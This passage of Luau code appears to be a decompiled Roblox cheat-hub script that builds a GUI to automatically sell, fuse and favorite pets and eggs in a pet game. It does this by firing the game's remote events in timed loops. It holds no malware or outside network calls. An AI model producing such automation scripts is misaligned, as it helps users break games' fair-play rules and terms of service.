							if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
								local ok2, result2 = pcall(eggRecords.SellPrice, v35)
								n21 += ok2 and tonumber(result2) or 0
							end
						end
					end
				end

				return tbl32, n21
			end

			local function fn18(arg, arg2)
				local rePetSatchelSellSelection = networking:FindFirstChild("RE/PetSatchel/SellSelection")
				if not rePetSatchelSellSelection or not rePetSatchelSellSelection:IsA("RemoteEvent") then
					return false
				end
				local n21 = math.max(#arg, #arg2)
				local n22 = 1

				while n22 <= n21 do
					local tbl32 = {}
					local tbl33 = {}

					for i = n22, n22 + n15 - 1 do
						if arg[i] then
							table.insert(tbl32, arg[i])
						end

						if arg2[i] then
							table.insert(tbl33, arg2[i])
						end
					end

					pcall(rePetSatchelSellSelection.FireServer, rePetSatchelSellSelection, { Eggs = tbl33, Assets = tbl32 })
					n22 += n15

					if n22 <= n21 then
						task.wait(0.3)
					end
				end

				return true
			end

			local function fn19(arg, arg2)
				if flag5 or #arg == 0 and #arg2 == 0 then
					return
				end
				flag5 = true
				n20 = os.clock() + n14

				task.spawn(function()
					pcall(fn18, arg, arg2)
					flag5 = false
					tbl2.Wake()
				end)
			end

			tbl2.Add(function()
				local v32 = tbl3.Toggle(v26, false)
				local v33 = tbl3.Toggle(v27, false)
				local v34, v35 = fn16()
				local v36, v37 = fn17()

				if v29 and type(v29.Set) == "function" then
					pcall(v29.Set, v29, string.format("Pet matches  -  %d pets for %s", #v34, fn10(v35)))
				end

				if v28 and type(v28.Set) == "function" then
					pcall(v28.Set, v28, string.format("Egg matches  -  %d eggs for %s", #v36, fn10(v37)))
				end

				local v38 = flag5
				local flag6

				if flag5 then
					flag6 = v38
				else
					flag6 = os.clock() < n20
				end

				if not flag6 then
					flag6 = not (v32 or v33)
				end

				if flag6 then
					return false
				end
				fn19(v32 and v34 or {}, v33 and v36 or {})
				return false
			end)

			v29 = v20:CreateText({ Name = "Pet Sell Preview", Text = "Pet matches  -  0 pets" })

			v26 = v20:CreateToggle({
				Name = "Auto Sell Pet",
				Default = false,
				Callback = function()
					tbl2.Wake()
				end,
			})

			v20:CreateButton({
				Name = "Sell Pets Now",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = v26,
				Callback = function()
					fn19(fn16(), {})
				end,
			})

			v20:CreateDropdown({
				Name = "Sell Pet Rule",
				Note = "Which checks must pass to sell",
				Options = tbl25,
				Default = tbl25[1],
				SubOf = v26,
				Callback = function(arg)
					if table.find(tbl25, arg) then
						v30 = arg
						tbl2.Wake()
					end
				end,
			})

			v20:CreateDropdown({
				Name = "Pet Max Rarity",
				Note = "Sell pets at or below this rarity",
				Options = tbl26,
				Default = fn9(3),
				SubOf = v26,
				Callback = function(arg)
					n16 = tbl27[arg] or n16
					tbl2.Wake()
				end,
			})

			local tbl32 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local function fn20(arg, arg2, arg3, arg4)
				local v32 = nil
				local n21 = 0
				local str2 = "M/s"

				local function fn21(arg5, arg6)
					if arg5 ~= nil then
						n21 = math.max(0, math.floor(tonumber(arg5) or n21))
					end

					if arg6 ~= nil then
						str2 = tostring(arg6)
					end

					arg4(n21 * (tbl32[str2] or tbl32["M/s"]).Mult)
					tbl2.Wake()
				end

				return (v20:CreateSlider({
					Name = arg,
					Note = arg2,
					Min = 0,
					Max = 1000,
					Default = 0,
					AllowDecimals = false,
					Increment = 1,
					Unit = {
						Default = "M/s",
						Selector = true,
						Options = { "K/s", "M/s", "B/s" },
						ColorEnabled = true,
						Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
						Callback = function(arg5)
							local ms = tbl32[arg5] or tbl32["M/s"]

							if v32 and v32.SetRange then
								v32:SetRange(ms.Min, ms.Max)
								local min = tonumber(v32:Get()) or ms.Min
								local min2 = ms.Min
								local max = ms.Max
								local n22 = math.clamp(math.floor(min + 0.5), min2, max)

								if n22 ~= min then
									str2 = tostring(arg5)
									v32:Set(n22)
									return
								end

								fn21(n22, arg5)
							else
								fn21(nil, arg5)
							end
						end,
					},
					SubOf = arg3,
					Callback = function(arg5)
						fn21(arg5, nil)
					end,
				}))
			end

			fn20("Pet Value Threshold", "Sell pets worth less than this (0 = off)", v26, function(arg)
				n17 = arg
			end)

			local v32 = nil

			v32 = v20:CreateToggle({
				Name = "Keep Mutated Pets",
				Note = "Never sell mutated pets",
				Default = true,
				SubOf = v26,
				Callback = function()
					flag3 = tbl3.Toggle(v32, true)
					tbl2.Wake()
				end,
			})

			fn5(v20:CreateMultiDropdown({
				Name = "Blacklist Sell Pets",
				Note = "These pets are never sold",
				Options = tbl28,
				Default = {},
				SubOf = v26,
				Callback = function(arg)
					tbl30 = fn11(arg, tbl29)
					tbl2.Wake()
				end,
			}))

			v28 = v20:CreateText({ Name = "Egg Sell Preview", Text = "Egg matches  -  0 eggs" })

			v27 = v20:CreateToggle({
				Name = "Auto Sell Egg",
				Note = "Sell bag eggs matching the rules below",
				Default = false,
				Callback = function()
					tbl2.Wake()
				end,
			})

			v20:CreateButton({
				Name = "Sell Eggs Now",
				Note = "Sell matching eggs once",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = v27,
				Callback = function()
					local v33 = fn17()
					fn19({}, v33)
				end,
			})

			v20:CreateDropdown({
				Name = "Sell Egg Rule",
				Note = "Which checks must pass to sell",
				Options = tbl25,
				Default = tbl25[1],
				SubOf = v27,
				Callback = function(arg)
					if table.find(tbl25, arg) then
						v31 = arg
						tbl2.Wake()
					end
				end,
			})

			v20:CreateDropdown({
				Name = "Egg Max Rarity",
				Note = "Sell eggs at or below this rarity",
				Options = tbl26,
				Default = fn9(3),
				SubOf = v27,
				Callback = function(arg)
					n18 = tbl27[arg] or n18
					tbl2.Wake()
				end,
			})

			fn20("Egg Value Threshold", "Sell eggs worth less than this (0 = off)", v27, function(arg)
				n19 = arg
			end)

			local v33 = nil

			v33 = v20:CreateToggle({
				Name = "Keep Mutated Eggs",
				Note = "Never sell mutated eggs",
				Default = true,
				SubOf = v27,
				Callback = function()
					flag4 = tbl3.Toggle(v33, true)
					tbl2.Wake()
				end,
			})

			fn5(v20:CreateMultiDropdown({
				Name = "Blacklist Sell Eggs",
				Note = "These eggs are never sold",
				Options = tbl28,
				Default = {},
				SubOf = v27,
				Callback = function(arg)
					tbl31 = fn11(arg, tbl29)
					tbl2.Wake()
				end,
			}))
		end

		local save2 = tbl.Save

		if type(save2) == "table" and type(save2.FieldSignal) == "function" then
			for _, v29 in ipairs({ "Inventory", "EggInventory", "EquippedAssets" }) do
				local ok, result = pcall(save2.FieldSignal, v29)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl2.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local n16
		n16 = 2
		local n17
		n17 = 3
		local n18
		n18 = 20
		local tbl30
		tbl30 = { "Lowest Rarity First", "Highest Rarity First", "Most Copies First", "Lowest Value First" }
		local tbl31
		tbl31 = { "Lowest To Highest", "Highest To Lowest" }
		local tbl32
		tbl32 = {}
		local tbl33
		tbl33 = {}
		local tbl34
		tbl34 = {}
		local tbl35
		tbl35 = {}

		do
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl36 = {}
			local tbl37 = {}

			if type(directory) == "table" then
				for k, v29 in pairs(directory) do
					local rarity = type(v29) == "table" and v29.Rarity or nil
					local rarity2 = type(rarity) == "table"

					if rarity2 then
						rarity2 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					rarity2 = rarity2 or nil

					if rarity2 then
						local rarityName = tostring(rarity.DisplayName or rarity._id or rarity2)
						tbl36[rarity2] = tbl36[rarity2] or rarityName
						local insert = table.insert
						local tbl38 = { Category = tostring(k) }
						local v30 = tostring
						k = v29.DisplayName or k
						tbl38.Name = v30(k)
						tbl38.Rarity = rarity2
						tbl38.RarityName = rarityName
						insert(tbl37, tbl38)
					end
				end
			end

			local tbl38 = {}

			for k in pairs(tbl36) do
				table.insert(tbl38, k)
			end

			table.sort(tbl38)

			for _, v29 in ipairs(tbl38) do
				local str2 = string.format("%d - %s", v29, tbl36[v29])
				table.insert(tbl32, str2)
				tbl33[str2] = v29
			end

			table.sort(tbl37, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v29 in ipairs(tbl37) do
				local str2 = string.format("%s [%s]", v29.Name, v29.RarityName)

				if tbl35[str2] then
					str2 = string.format("%s [%s] (%s)", v29.Name, v29.RarityName, v29.Category)
				end

				table.insert(tbl34, str2)
				tbl35[str2] = v29.Category
			end
		end

		local v29

		do
			local function fn10(arg)
				for _, v30 in ipairs(tbl32) do
					if tbl33[v30] == arg then
						return v30
					end
				end

				return tbl32[#tbl32]
			end

			v29 = nil
			local v30 = nil
			local v31 = tbl30[1]
			local v32 = tbl31[1]
			local n19 = 6
			local tbl36 = {}
			local flag3 = true
			local flag4 = true
			local flag5 = false
			local n20 = 0
			local n21 = 0
			local n22 = 0
			local tbl37 = {}

			local function fn11(arg, arg2)
				local v33 = networking:FindFirstChild(arg)
				if not v33 or not v33:IsA("RemoteFunction") then
					return false, nil
				end

				if arg2 == nil then
					return pcall(v33.InvokeServer, v33)
				end
				return pcall(v33.InvokeServer, v33, arg2)
			end

			local function fn12()
				local save3 = tbl.Save
				if type(save3) ~= "table" or type(save3.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save3.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn13(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				return type(directory) == "table" and directory[tostring(arg)] or nil
			end

			local function fn14(arg)
				local v33 = fn13(arg)
				local rarity = type(v33) == "table" and v33.Rarity or nil
				local flag6 = type(rarity) == "table"

				if flag6 then
					flag6 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag6 or math.huge
			end

			local function fn15(arg)
				local v33 = fn13(arg)
				return tostring(type(v33) == "table" and v33.DisplayName or arg)
			end

			local function fn16(arg)
				local v33 = fn13(arg.Category)
				local n23 = type(v33) == "table" and tonumber(v33.EarningRate) or 0
				local n24 = tonumber(arg.Scale) or 0
				if n23 <= 0 or n24 <= 0 then
					return 0
				end
				local n25 = n24 > 5 and (n24 / 5) ^ 1.2 * 19.637875755794113 or n24 ^ 1.85
				local mutations = tbl.Mutations
				local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n26 = 1

				if flag6 then
					local ok
					ok, n26 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n26) == "number"
					local n27 = 1

					if not ok then
						n26 = n27
					end
				end

				return n23 * n25 * n26
			end

			local function fn17(arg)
				return type(arg) == "table" and next(arg) ~= nil
			end

			local function fn18(arg)
				local n23 = tonumber(arg) or 0
				local tbl38 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n24 = 1

				while math.abs(n23) >= 1000 and n24 < #tbl38 do
					n23 /= 1000
					n24 += 1
				end

				return string.format(n24 == 1 and "$%.0f%s" or "$%.2f%s", n23, tbl38[n24])
			end

			local function fn19(arg)
				local fuseKernel = tbl.FuseKernel
				if type(fuseKernel) ~= "table" or type(fuseKernel.PriceFor) ~= "function" then
					return nil
				end
				local ok, result = pcall(fuseKernel.PriceFor, arg)
				return ok and tonumber(result) or nil
			end

			local function fn20(arg, arg2, arg3)
				local flag6 = type(arg2) == "table" and arg2.IsFavorite ~= true and not arg3[arg] and fn14(arg2.Category) <= n19 and (next(tbl36) == nil or tbl36[tostring(arg2.Category)] == true)

				if flag6 then
					flag6 = not (flag3 and fn17(arg2.Mutations))
				end

				if flag6 then
					flag6 = (tbl37[arg] or 0) <= os.clock()
				end

				return flag6
			end

			local function fn21(arg)
				local inventory = type(arg.Inventory) == "table" and arg.Inventory or {}
				local tbl38 = {}
				local v33 = pairs
				local equippedAssets = arg.EquippedAssets or {}

				for _, equippedAsset in v33(equippedAssets) do
					tbl38[equippedAsset] = true
				end

				local tbl39 = {}
				local tbl40 = {}

				for i = 1, 3 do
					local flag6 = type(arg.FusionSlots) == "table" and arg.FusionSlots[i] or nil

					if flag6 ~= nil and type(inventory[flag6]) == "table" then
						table.insert(tbl39, flag6)
						tbl40[flag6] = true
					end
				end

				local tbl41 = {}

				for k, v34 in pairs(inventory) do
					if not tbl40[k] and type(v34) == "table" and v34.InFuse ~= true and fn20(k, v34, tbl38) then
						local str2 = tostring(v34.Category)
						tbl41[str2] = tbl41[str2] or {}
						table.insert(tbl41[str2], { Uid = k, Item = v34, Income = fn16(v34) })
					end
				end

				local function fn22(arg2)
					table.sort(arg2, function(arg3, arg4)
						if arg3.Income ~= arg4.Income then
							if v32 == tbl31[2] then
								return arg3.Income > arg4.Income
							end
							return arg3.Income < arg4.Income
						end

						return tostring(arg3.Uid) < tostring(arg4.Uid)
					end)
				end

				if #tbl39 > 0 then
					local str2 = tostring(inventory[tbl39[1]].Category)
					local flag6 = true

					for _, v34 in ipairs(tbl39) do
						local v35 = inventory[v34]

						if tostring(v35.Category) ~= str2 or not fn20(v34, v35, tbl38) then
							flag6 = false
						end
					end

					local tbl42 = tbl41[str2] or {}

					if flag6 and #tbl39 + #tbl42 >= 3 then
						fn22(tbl42)
						local tbl43 = { Category = str2, Load = {}, Items = {} }

						for _, v34 in ipairs(tbl39) do
							table.insert(tbl43.Items, inventory[v34])
						end

						for i = 1, 3 - #tbl39 do
							table.insert(tbl43.Load, tbl42[i].Uid)
							table.insert(tbl43.Items, tbl42[i].Item)
						end

						return tbl43
					end

					if flag4 then
						return { Category = str2, Eject = tbl39 }
					end
					return nil, "Machine holds pets that cannot finish a fuse"
				end

				local v34 = nil
				local v35 = nil

				for k, v36 in pairs(tbl41) do
					if #v36 >= 3 then
						local v37 = fn14(k)
						local n23 = 0

						for _, v38 in ipairs(v36) do
							n23 += v38.Income
						end

						local tbl42

						if v31 == tbl30[2] then
							tbl42 = { -v37, -#v36 }
						elseif v31 == tbl30[3] then
							tbl42 = { -#v36, v37 }
						elseif v31 == tbl30[4] then
							tbl42 = { n23 / #v36, v37 }
						else
							tbl42 = { v37, -#v36 }
						end

						if v34 == nil or tbl42[1] < v34[1] or tbl42[1] == v34[1] and (tbl42[2] < v34[2] or tbl42[2] == v34[2] and k < v35) then
							v34 = tbl42
							v35 = k
						end
					end
				end

				if not v35 then
					return nil, "No three matching pets"
				end
				local v36 = tbl41[v35]
				fn22(v36)
				local tbl42 = { Category = v35, Load = {}, Items = {} }

				for i = 1, 3 do
					table.insert(tbl42.Load, v36[i].Uid)
					table.insert(tbl42.Items, v36[i].Item)
				end

				return tbl42
			end

			local function fn22(arg)
				local v33 = fn12()
				if not v33 then
					return
				end

				if v33.FusionLocked == true then
					if type(v33.FusionEggReward) == "table" and os.clock() >= n22 then
						n22 = os.clock() + n17
						fn11("RF/Fusery/FinishReveal")
					end

					return
				end

				local v34 = fn21(v33)
				if not v34 then
					return
				end

				if v34.Eject then
					for _, v35 in ipairs(v34.Eject) do
						if arg ~= n20 then
							return
						end
						fn11("RF/Fusery/EjectPet", v35)
						task.wait(0.35)
					end

					return
				end

				local v35 = fn19(v34.Items)
				local num = tonumber(v33.Money)
				if v35 and num and num < v35 then
					return
				end

				for _, v36 in ipairs(v34.Load) do
					if arg ~= n20 then
						return
					end
					local LoadPet, v37 = fn11("RF/Fusery/LoadPet", v36)
					if not LoadPet or v37 == false then
						tbl37[v36] = os.clock() + n18
						return
					end
					task.wait(0.35)
				end

				if arg ~= n20 then
					return
				end
				local BeginFuse, v36 = fn11("RF/Fusery/BeginFuse")

				if BeginFuse and v36 ~= false then
					n22 = os.clock() + n17
				end
			end

			local function fn23(arg)
				if not arg then
					return "Fuse status unknown"
				end

				if arg.FusionLocked == true then
					return "Machine is fusing, waiting for the egg"
				end
				local v33, v34 = fn21(arg)
				if not v33 then
					return v34 or "No three matching pets"
				end

				if v33.Eject then
					return string.format("Would eject %d %s that cannot finish a fuse", #v33.Eject, fn15(v33.Category))
				end
				local v35 = fn19(v33.Items)
				local num = tonumber(arg.Money)
				local str2 = v35 and num and num < v35 and "  (not enough money)" or ""
				return string.format("Next fuse  -  3 %s for %s%s", fn15(v33.Category), v35 and fn18(v35) or "?", str2)
			end

			tbl2.Add(function()
				local v33 = fn12()

				if v30 and type(v30.Set) == "function" then
					pcall(v30.Set, v30, fn23(v33))
				end

				if not tbl3.Toggle(v29, false) or flag5 or os.clock() < n21 then
					return false
				end
				flag5 = true
				n21 = os.clock() + n16
				local v34 = n20

				task.spawn(function()
					pcall(fn22, v34)
					flag5 = false
					tbl2.Wake()
				end)

				return false
			end)

			v30 = v21:CreateText({ Name = "Fuse Preview", Text = "Fuse status unknown" })

			v29 = v21:CreateToggle({
				Name = "Auto Fuse Machine",
				Note = "Fuse 3 same pets into an egg, nonstop",
				Default = false,
				Callback = function()
					n20 += 1
					table.clear(tbl37)
					n21 = 0
					tbl2.Wake()
				end,
			})

			v21:CreateDropdown({
				Name = "Fuse Priority Mode",
				Options = tbl30,
				Default = tbl30[1],
				SubOf = v29,
				Callback = function(arg)
					if table.find(tbl30, arg) then
						v31 = arg
						tbl2.Wake()
					end
				end,
			})

			v21:CreateDropdown({
				Name = "Pets To Use",
				Options = tbl31,
				Default = tbl31[1],
				SubOf = v29,
				Callback = function(arg)
					if table.find(tbl31, arg) then
						v32 = arg
						tbl2.Wake()
					end
				end,
			})

			v21:CreateDropdown({
				Name = "Max Rarity to Fuse",
				Options = tbl32,
				Default = fn10(6),
				SubOf = v29,
				Callback = function(arg)
					n19 = tbl33[arg] or n19
					tbl2.Wake()
				end,
			})

			fn5(v21:CreateMultiDropdown({
				Name = "Specific Species to Fuse",
				Note = "Only fuse these species (empty = all)",
				Options = tbl34,
				Default = {},
				SubOf = v29,
				Callback = function(arg)
					local tbl38 = {}

					if type(arg) == "table" then
						for k, v33 in pairs(arg) do
							k = v33 == true and type(k) == "string" and k or type(v33) == "string" and v33 or nil

							if k and tbl35[k] then
								tbl38[tbl35[k]] = true
							end
						end
					end

					tbl36 = tbl38
					tbl2.Wake()
				end,
			}))

			local v33 = nil

			v33 = v21:CreateToggle({
				Name = "Skip Mutated Pets",
				Default = true,
				SubOf = v29,
				Callback = function()
					flag3 = tbl3.Toggle(v33, true)
					tbl2.Wake()
				end,
			})

			local v34 = nil

			v34 = v21:CreateToggle({
				Name = "Eject Incomplete Slots",
				Note = "Take out pets that can't make a set",
				Default = true,
				SubOf = v29,
				Callback = function()
					flag4 = tbl3.Toggle(v34, true)
					tbl2.Wake()
				end,
			})
		end

		local save3 = tbl.Save

		if type(save3) == "table" and type(save3.FieldSignal) == "function" then
			for _, v30 in ipairs({
				"Inventory",
				"EquippedAssets",
				"FusionSlots",
				"FusionLocked",
				"FusionEggReward",
				"Money",
			}) do
				local ok, result = pcall(save3.FieldSignal, v30)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl2.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		n4 = 2
		n5 = 25
		n6 = 4
		tbl13 = { "Match Any", "Match All" }

		do
			local tbl36 = { "Golden", "Silver", "Rainbow", "Boss", "Monstrous", "Sakura", "GreatBloom" }
			str = "Any Mutation"
			tbl14 = { "Off" }
			tbl15 = {}
			tbl16 = {}
			tbl17 = {}
			tbl18 = { "Any Mutation" }
			tbl19 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl37 = {}
			local tbl38 = {}

			if type(directory) == "table" then
				for k, v30 in pairs(directory) do
					local rarity = type(v30) == "table" and v30.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						local str2 = tostring(rarity.DisplayName or rarity._id or flag3)
						tbl37[flag3] = tbl37[flag3] or str2

						table.insert(tbl38, {
							Category = tostring(k),
							Name = tostring(v30.DisplayName or k),
							Rarity = flag3,
							RarityName = str2,
						})
					end
				end
			end

			local tbl39 = {}

			for k in pairs(tbl37) do
				table.insert(tbl39, k)
			end

			table.sort(tbl39)

			for _, v30 in ipairs(tbl39) do
				local str2 = string.format("%d - %s", v30, tbl37[v30])
				table.insert(tbl14, str2)
				tbl15[str2] = v30
			end

			table.sort(tbl38, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v30 in ipairs(tbl38) do
				local str2 = string.format("%s [%s]", v30.Name, v30.RarityName)

				if tbl17[str2] then
					str2 = string.format("%s [%s] (%s)", v30.Name, v30.RarityName, v30.Category)
				end

				table.insert(tbl16, str2)
				tbl17[str2] = v30.Category
			end

			local tbl40 = {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl40, tostring(k))
				end
			end

			if #tbl40 == 0 then
				tbl40 = table.clone(tbl36)
			end

			table.sort(tbl40, function(arg, arg2)
				return fn6(arg) < fn6(arg2)
			end)

			for _, v30 in ipairs(tbl40) do
				local v31 = fn6(v30)
				table.insert(tbl18, v31)
				tbl19[v31] = v30
			end
		end

		v12 = nil
		v13 = nil
		v14 = nil
		createText = nil
		v15 = tbl13[2]
		v16 = nil
		flag = false
		tbl20 = {}
		n7 = 0
		tbl21 = {}
		flag2 = false
		n8 = 0
		tbl22 = {}

		fn7 = function()
			local save4 = tbl.Save
			if type(save4) ~= "table" or type(save4.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save4.Get)
			return ok and type(result) == "table" and result or nil
		end

		do
			local function fn10(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				return type(directory) == "table" and directory[tostring(arg)] or nil
			end

			local function fn11(arg)
				local v30 = fn10(arg)
				local rarity = type(v30) == "table" and v30.Rarity or nil
				local flag3 = type(rarity) == "table"

				if flag3 then
					flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag3 or 0
			end

			local function fn12(arg)
				local v30 = fn10(arg.Category)
				local n19 = type(v30) == "table" and tonumber(v30.EarningRate) or 0
				local n20 = tonumber(arg.Scale) or 0
				if n19 <= 0 or n20 <= 0 then
					return 0
				end
				local n21 = n20 > 5 and (n20 / 5) ^ 1.2 * 19.637875755794113 or n20 ^ 1.85
				local mutations = tbl.Mutations
				local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n22 = 1

				if flag3 then
					local ok
					ok, n22 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n22) == "number"
					local n23 = 1

					if not ok then
						n22 = n23
					end
				end

				return n19 * n21 * n22
			end

			local function fn13(arg)
				local tbl36 = {}

				if type(arg.Mutations) == "table" then
					for k, mutation in pairs(arg.Mutations) do
						if type(mutation) == "string" then
							tbl36[mutation] = true
						elseif mutation == true and type(k) == "string" then
							tbl36[k] = true
						end
					end
				end

				if type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
					tbl36[arg.BaseMutation] = true
				end

				return tbl36
			end

			fn8 = function(arg)
				if tbl21[tostring(arg.Category)] then
					return true
				end
				local n19 = 0
				local n20 = 0

				if v16 then
					n19 = 1

					if fn11(arg.Category) >= v16 then
						n20 = 1
					end
				end

				if flag or next(tbl20) ~= nil then
					n19 += 1
					local v30 = fn13(arg)

					if flag and next(v30) ~= nil then
						n20 += 1
					else
						local flag3 = false

						for k in pairs(v30) do
							if tbl20[k] then
								flag3 = true
								break
							end
						end

						if flag3 then
							n20 += 1
						end
					end
				end

				if n7 > 0 then
					n19 += 1

					if n7 <= fn12(arg) then
						n20 += 1
					end
				end

				if n19 == 0 then
					return false
				end

				if v15 == tbl13[2] then
					return n20 == n19
				end
				return n20 > 0
			end
		end
	end

	local n9, n10, tbl23, tbl24, n11, snapshot, n12, flag3, n13, n14
	local str2, tbl25, flag4, n15, fn9, fn10, fn11, fn12, fn13, fn14
	local fn15, fn16, tbl26, fn17, fn18, fn19, fn20, fn21, fn22, fn23
	local v17, v18, v19, tbl27, tbl28, tbl29, fn24, fn25, fn26, fn27
	local fn28, fn29, v20

	do
		local n16

		do
			local fn30, fn31

			do
				local function fn32(arg)
					return (tbl22[arg] or 0) > os.clock()
				end

				local function fn33(arg)
					local tbl30 = {}
					local v21, v22, v23 = pairs(arg.Inventory or {})
					local n17 = 0

					for k, v24 in v21, v22, v23 do
						if type(v24) == "table" and fn8(v24) then
							n17 += 1

							if v24.IsFavorite ~= true and not fn32(k) then
								table.insert(tbl30, k)
							end
						end
					end

					return tbl30, n17
				end

				fn30 = function(arg, arg2, arg3)
					local tbl30 = {}
					local inventory = arg.Inventory or {}
					local v21 = pairs
					local equippedAssets = arg.EquippedAssets or {}

					for _, equippedAsset in v21(equippedAssets) do
						local v22 = inventory[equippedAsset]

						if type(v22) == "table" and not fn32(equippedAsset) then
							if arg2 then
								if v22.IsFavorite ~= true then
									table.insert(tbl30, equippedAsset)
								end
							else
								local flag5 = v22.IsFavorite == true
								local flag6

								if flag5 then
									flag6 = not (arg3 and fn8(v22))
								else
									flag6 = flag5
								end

								if flag6 then
									table.insert(tbl30, equippedAsset)
								end
							end
						end
					end

					return tbl30
				end

				local function fn34(arg, arg2)
					local rePetSatchelWriteFavourite = networking:FindFirstChild("RE/PetSatchel/WriteFavourite")
					if not rePetSatchelWriteFavourite or not rePetSatchelWriteFavourite:IsA("RemoteEvent") then
						return
					end

					for i, v21 in ipairs(arg) do
						if not (n5 < i) then
							tbl22[v21] = os.clock() + n6
							pcall(rePetSatchelWriteFavourite.FireServer, rePetSatchelWriteFavourite, v21, arg2)
							task.wait(0.12)
							continue
						end

						break
					end
				end

				fn31 = function(arg, arg2)
					local v21 = flag2
					local flag5

					if flag2 then
						flag5 = v21
					else
						flag5 = #arg == 0
					end

					if flag5 then
						return false
					end
					flag2 = true
					n8 = os.clock() + n4

					task.spawn(function()
						pcall(fn34, arg, arg2)
						flag2 = false
						tbl2.Wake()
					end)

					return true
				end

				tbl2.Add(function()
					local v21 = fn7()
					if not v21 then
						return false
					end
					local v22 = tbl3.Toggle(v12, false)
					local v23, v24 = fn33(v21)

					if createText and type(createText.Set) == "function" then
						local v25 = pairs
						local inventory = v21.Inventory or {}
						local n17 = 0

						for _, v26 in v25(inventory) do
							if type(v26) == "table" and v26.IsFavorite == true then
								n17 += 1
							end
						end

						pcall(createText.Set, createText, string.format("Favorite matches  -  %d pets, %d to mark  |  %d favorited", v24, #v23, n17))
					end

					if flag2 or os.clock() < n8 then
						return false
					end

					if v22 and fn31(v23, true) then
						return false
					end

					if tbl3.Toggle(v13, false) then
						if fn31(fn30(v21, true, false), true) then
							return false
						end
					elseif tbl3.Toggle(v14, false) then
						fn31(fn30(v21, false, v22), false)
					end

					return false
				end)

				createText = v10.CreateText
				createText = createText(v10, { Name = "Favorite Preview", Text = "Favorite matches  -  0 pets" })

				v12 = v10:CreateToggle({
					Name = "Auto Favorite Pet",
					Note = "Favorite pets matching the rules below",
					Default = false,
					Callback = function()
						table.clear(tbl22)
						tbl2.Wake()
					end,
				})

				v10:CreateButton({
					Name = "Favorite Pets Now",
					Note = "Favorite matching pets once",
					ButtonText = "Favorite",
					ConfirmText = "Done!",
					SubOf = v12,
					Callback = function()
						local v21 = fn7()

						if v21 then
							fn31(fn33(v21), true)
						end
					end,
				})
			end

			v10:CreateDropdown({
				Name = "Favorite Rule",
				Note = "Pass any check or all checks",
				Options = tbl13,
				Default = tbl13[2],
				SubOf = v12,
				Callback = function(arg)
					if table.find(tbl13, arg) then
						v15 = arg
						tbl2.Wake()
					end
				end,
			})

			v10:CreateDropdown({
				Name = "Favorite Min Rarity",
				Note = "Favorite pets of the chosen rarity and every rarity above it (Off = skip)",
				Options = tbl14,
				Default = "Off",
				SubOf = v12,
				Callback = function(arg)
					v16 = tbl15[arg]
					tbl2.Wake()
				end,
			})

			fn5(v10:CreateMultiDropdown({
				Name = "Favorite Mutations",
				Note = "Mutation check (empty = skip)",
				Options = tbl18,
				Default = {},
				SubOf = v12,
				Callback = function(arg)
					local tbl30 = {}
					local flag5 = false

					if type(arg) == "table" then
						for k, v21 in pairs(arg) do
							k = v21 == true and type(k) == "string" and k
							local flag6

							if k then
								flag6 = k
							else
								flag6 = type(v21) == "string" and v21
							end

							local v22 = flag6 or nil

							if v22 == str then
								flag5 = true
							elseif v22 then
								tbl30[tbl19[v22] or v22] = true
							end
						end
					end

					flag = flag5
					tbl20 = tbl30
					tbl2.Wake()
				end,
			}))

			do
				local tbl30 = {
					["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
					["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
					["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
				}

				local v21 = nil
				local n17 = 0
				local str3 = "M/s"

				local function fn32(arg, arg2)
					if arg ~= nil then
						n17 = math.max(0, math.floor(tonumber(arg) or n17))
					end

					if arg2 ~= nil then
						str3 = tostring(arg2)
					end

					n7 = n17 * (tbl30[str3] or tbl30["M/s"]).Mult
					tbl2.Wake()
				end

				v21 = v10:CreateSlider({
					Name = "Favorite Min Value",
					Note = "Value check (0 = skip)",
					Min = 0,
					Max = 1000,
					Default = 0,
					AllowDecimals = false,
					Increment = 1,
					Unit = {
						Default = "M/s",
						Selector = true,
